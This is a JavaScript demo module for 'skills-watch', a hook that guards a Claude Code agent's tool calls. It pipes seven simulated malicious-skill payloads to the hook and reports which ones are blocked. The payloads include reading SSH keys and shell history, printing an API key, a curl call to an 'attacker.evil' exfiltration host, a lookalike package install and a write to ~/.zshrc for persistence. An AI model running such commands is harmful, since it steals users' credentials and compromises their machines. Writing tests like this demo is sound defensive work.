'use strict';
const { spawn } = require('child_process');
const path = require('path');
const { HOME } = require('./common');

// Every payload below is a locally-generated simulation of a known attack
// pattern. Nothing reaches the network, no real files are read, no real
// tool call is performed. The demo pipes the payload to the real hook
// binary and observes whether it returns exit 2 (block) or exit 0 (allow).
const SCENARIOS = [
  {
    name: 'SSH private-key exfiltration',
    description: 'A skill tries to read ~/.ssh/id_rsa — the classic exfil vector.',
    payload: { tool_name: 'Read', tool_input: { file_path: path.join(HOME, '.ssh', 'id_rsa') } },
  },
  {
    name: 'API-key environment sniffing',
    description: 'A skill tries to pull ANTHROPIC_API_KEY out of the environment.',
    payload: { tool_name: 'Bash', tool_input: { command: 'printenv ANTHROPIC_API_KEY' } },
  },
  {
    name: 'Exfiltration via curl to attacker host',
    description: 'A skill tries to POST data to a host outside the allow-list.',
    payload: { tool_name: 'Bash', tool_input: { command: 'curl https://attacker.evil/exfil' } },
  },
  {
    name: 'Supply-chain attack via mid-run install',
    description: 'A skill tries to install a lookalike package during execution.',
    payload: { tool_name: 'Bash', tool_input: { command: 'pip install shady-lookalike-requests' } },
  },
  {
    name: 'Persistent backdoor via shell RC',
    description: 'A skill tries to append to ~/.zshrc to stay resident.',
    payload: { tool_name: 'Write', tool_input: { file_path: path.join(HOME, '.zshrc') } },
  },
  {
    name: 'Shell-history PII scrape',
    description: 'A skill tries to read ~/.zsh_history for leaked secrets.',
    payload: { tool_name: 'Read', tool_input: { file_path: path.join(HOME, '.zsh_history') } },
  },
  {
    name: 'Git identity exfiltration',
    description: "A skill tries to read ~/.gitconfig to harvest your name/email.",
    payload: { tool_name: 'Read', tool_input: { file_path: path.join(HOME, '.gitconfig') } },
  },
];

function runHook(payload) {
  return new Promise((resolve) => {
    const hookPath = path.join(__dirname, '..', 'bin', 'skills-watch-hook.js');
    // Force empty skill context (deterministic demo output showing global scope) and
    // suppress log writes (don't pollute the user's live.log with demo events).
    const env = { ...process.env, SKILLS_WATCH_FORCE_SKILL: '', SKILLS_WATCH_NOLOG: '1' };
    const child = spawn(process.execPath, [hookPath], { stdio: ['pipe', 'pipe', 'pipe'], env });
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d.toString(); });
    child.stdout.on('data', () => {});
    child.on('close', (exit) => resolve({ exit, stderr: stderr.trim() }));
    child.on('error', () => resolve({ exit: -1, stderr: '<hook binary not launchable>' }));
    child.stdin.write(JSON.stringify(payload));
    child.stdin.end();
  });
}

async function runDemo() {
  console.log('');
  console.log('skills-watch demo — running 7 simulated attacks against the real hook.');
  console.log('All payloads are locally generated. Nothing leaves your machine.');
  console.log('');
  let blocked = 0;
  for (const s of SCENARIOS) {
    const r = await runHook(s.payload);
    const ok = r.exit === 2;
    if (ok) blocked++;
    const status = ok ? '\x1b[32mBLOCKED\x1b[0m' : '\x1b[31mNOT BLOCKED\x1b[0m';
    console.log(`  ${status}  ${s.name}`);
    console.log(`    ${s.description}`);
    if (r.stderr) {
      const firstLine = r.stderr.split('\n')[0];
      console.log(`    └─ ${firstLine}`);
    }
    console.log('');
  }
  console.log(`${blocked}/${SCENARIOS.length} attacks blocked by skills-watch's universal deny-list.`);
  console.log('');
  if (blocked === SCENARIOS.length) {
    console.log('Install the guard for real:  \x1b[1mnpx skills-watch install\x1b[0m');
    console.log('Then start a new Claude Code session and every tool call the agent makes is guarded.');
  } else {
    console.log('\x1b[33mWARNING:\x1b[0m one or more demo attacks were not blocked. Something is wrong with the hook.');
    console.log('Please file an issue at https://github.com/shivag/skills-watch/issues');
  }
  console.log('');
  return blocked === SCENARIOS.length ? 0 : 1;
}

module.exports = { runDemo, SCENARIOS };
